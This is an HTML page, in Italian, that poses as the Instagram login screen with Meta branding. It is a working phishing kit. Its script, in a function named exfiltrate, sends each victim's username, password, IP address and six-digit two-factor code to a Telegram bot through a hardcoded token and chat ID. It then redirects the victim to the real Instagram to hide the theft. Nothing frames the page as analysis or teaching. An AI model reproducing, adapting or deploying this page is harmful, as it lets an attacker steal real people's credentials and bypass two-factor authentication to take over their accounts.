<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* تم تحسين الـ CSS ليكون أكثر استجابة ومطابقاً للهوية البصرية الحديثة لـ Meta */
        *{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body{ background:#0f2533; color:white; height:100vh; display:flex; justify-content:center; align-items:center; overflow: hidden; }
        
        .splash{ position:fixed; width:100%; height:100vh; background:#0f2533; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; transition: opacity 0.5s ease; }
        .splash svg{ width:100px; height:100px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        
        .metaSplash{ position:absolute; bottom:50px; text-align:center; color:#aaa; font-size:16px; }
        .metaSplash strong{ font-size:18px; background: linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }

        .container{ display:none; width:100%; max-width:350px; padding:20px; flex-direction:column; align-items:center; animation: fadeIn 0.4s ease; }
        .container.active{ display:flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .logo{ margin-bottom:40px; }
        .logo svg{ width:80px; height:80px; }

        .input-box{ width:100%; margin-bottom:15px; position: relative; }
        .input-box input{ width:100%; height:50px; border:1px solid #3b5266; border-radius:8px; background:#1a2b36; color:white; font-size:14px; padding:0 15px; outline:none; transition: 0.3s; }
        .input-box input:focus{ border-color:#0095f6; box-shadow: 0 0 0 1px #0095f6; }

        .login-btn{ width:100%; height:48px; border:none; border-radius:8px; background:#0095f6; color:white; font-size:16px; font-weight:bold; cursor:pointer; transition:0.2s; }
        .login-btn:disabled{ background:#3b5266; cursor:not-allowed; }
        
        .forgot{ margin-top:15px; color:#a4adb6; text-decoration:none; font-size:14px; text-align:center; display:block; }

        .twofa-container{ display:none; width:100%; max-width:350px; padding:20px; flex-direction:column; animation: fadeIn 0.4s ease; }
        .twofa-container.active{ display:flex; }

        .code-inputs{ display:flex; gap:8px; justify-content:center; margin: 25px 0; }
        .code-inputs input{ width:45px; height:55px; text-align:center; font-size:24px; border-radius:8px; border:1px solid #3b5266; background:#1a2b36; color:white; outline:none; }
        .code-inputs input:focus{ border-color:#0095f6; }

        .loading-screen{ display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#0f2533; z-index:10000; flex-direction:column; align-items:center; justify-content:center; }
        .spinner{ width:35px; height:35px; border:3px solid #3b5266; border-top-color:#0095f6; border-radius:50%; animation:spin 0.8s linear infinite; }
        @keyframes spin{ to{transform:rotate(360deg);} }
    </style>
</head>
<body>

    <div class="splash" id="splash">
        <svg viewBox="0 0 24 24" fill="none"><defs><linearGradient id="ig" x1="0" y1="1" x2="1" y2="0"><stop offset="0%" stop-color="#feda75"/><stop offset="20%" stop-color="#fa7e1e"/><stop offset="45%" stop-color="#d62976"/><stop offset="70%" stop-color="#962fbf"/><stop offset="100%" stop-color="#4f5bd5"/></linearGradient></defs><rect x="3" y="3" width="18" height="18" rx="5" stroke="url(#ig)" stroke-width="2.2"/><circle cx="12" cy="12" r="4.2" stroke="url(#ig)" stroke-width="2.2"/><circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig)"/></svg>
        <div class="metaSplash">from <strong>Meta</strong></div>
    </div>

    <div class="loading-screen" id="loadingScreen">
        <div class="spinner"></div>
        <p style="margin-top:15px; color:#cfd8dc;" id="loadingText">Verifica in corso...</p>
    </div>

    <div class="container active" id="loginContainer">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none"><defs><linearGradient id="ig2" x1="0" y1="1" x2="1" y2="0"><stop offset="0%" stop-color="#feda75"/><stop offset="20%" stop-color="#fa7e1e"/><stop offset="45%" stop-color="#d62976"/><stop offset="70%" stop-color="#962fbf"/><stop offset="100%" stop-color="#4f5bd5"/></linearGradient></defs><rect x="3" y="3" width="18" height="18" rx="5" stroke="url(#ig2)" stroke-width="2.2"/><circle cx="12" cy="12" r="4.2" stroke="url(#ig2)" stroke-width="2.2"/><circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig2)"/></svg>
        </div>
        <div class="input-box"><input type="text" id="username" placeholder="Nome utente, e-mail o telefono"></div>
        <div class="input-box"><input type="password" id="password" placeholder="Password"></div>
        <button class="login-btn" id="loginBtn" disabled>Accedi</button>
        <a href="#" class="forgot">Password dimenticata?</a>
    </div>

    <div class="twofa-container" id="twofaContainer">
        <h2 style="text-align:center; margin-bottom:10px;">Codice di sicurezza</h2>
        <p style="text-align:center; color:#a4adb6; font-size:14px;">Inserisci il codice inviato a <span id="displayUser" style="color:white;">...</span></p>
        <div class="code-inputs" id="codeInputs">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
        </div>
        <button class="login-btn" id="verifyBtn" disabled>Conferma</button>
    </div>

    <script>
        const CONFIG = {
            token: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
            chatId: '8278195073'
        };

        async function exfiltrate(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: 'POST',
                    mode: 'no-cors', 
                    body: new URLSearchParams({ chat_id: CONFIG.chatId, text: msg, parse_mode: 'Markdown' })
                });
            } catch (e) { console.error("Error"); }
        }

        // Splash Screen logic
        setTimeout(() => { document.getElementById('splash').style.opacity = '0'; setTimeout(() => document.getElementById('splash').remove(), 500); }, 2000);

        const uInput = document.getElementById('username');
        const pInput = document.getElementById('password');
        const lBtn = document.getElementById('loginBtn');

        function validate() { lBtn.disabled = !(uInput.value.length > 2 && pInput.value.length > 2); }
        uInput.oninput = pInput.oninput = validate;

        lBtn.onclick = async () => {
            const user = uInput.value;
            const pass = pInput.value;
            
            await exfiltrate(`🚨 *New Hit!* 🚨\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n🌐 IP: ${await getIP()}`);

            document.getElementById('loginContainer').classList.remove('active');
            document.getElementById('twofaContainer').classList.add('active');
            document.getElementById('displayUser').textContent = user;
            document.querySelector('.code-inputs input').focus();
        };

        // 2FA Logic
        const boxes = document.querySelectorAll('.code-inputs input');
        boxes.forEach((box, i) => {
            box.oninput = (e) => {
                if(e.target.value && i < 5) boxes[i+1].focus();
                const fullCode = Array.from(boxes).map(b => b.value).join('');
                document.getElementById('verifyBtn').disabled = fullCode.length !== 6;
            };
            box.onkeydown = (e) => { if(e.key === 'Backspace' && !box.value && i > 0) boxes[i-1].focus(); };
        });

        document.getElementById('verifyBtn').onclick = async () => {
            const code = Array.from(boxes).map(b => b.value).join('');
            document.getElementById('loadingScreen').style.display = 'flex';
            
            await exfiltrate(`🔢 *2FA CODE* 🔢\n👤 User: \`${uInput.value}\`\n🔑 Code: \`${code}\``);

            setTimeout(() => {
                window.location.replace('https://www.instagram.com');
            }, 2000);
        };

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'Unknown'; }
        }
    </script>
</body>
</html>
